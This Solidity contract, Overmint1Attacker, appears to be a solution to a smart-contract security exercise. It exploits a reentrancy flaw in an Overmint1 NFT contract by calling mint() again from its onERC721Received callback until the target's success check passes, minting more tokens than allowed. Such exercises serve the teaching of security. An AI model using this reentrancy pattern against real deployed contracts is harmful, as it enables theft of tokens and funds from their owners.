// SPDX-License-Identifier: Unlicensed
pragma solidity 0.8.24;

import "forge-std/console.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./Overmint1.sol";

contract Overmint1Attacker is IERC721Receiver {
    Overmint1 nft;

    constructor(Overmint1 nft_) {
        nft = nft_;
    }

    function attack() external {
        nft.mint();
    }

    function onERC721Received(
        address, // operator
        address, // from
        uint256, // tokenId
        bytes calldata // data
    ) external returns (bytes4) {
        uint256 balance = nft.balanceOf(address(this));
        console.log("onERC721Received() balance", balance);
        if (!nft.success(address(this))) {
            nft.mint();
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}
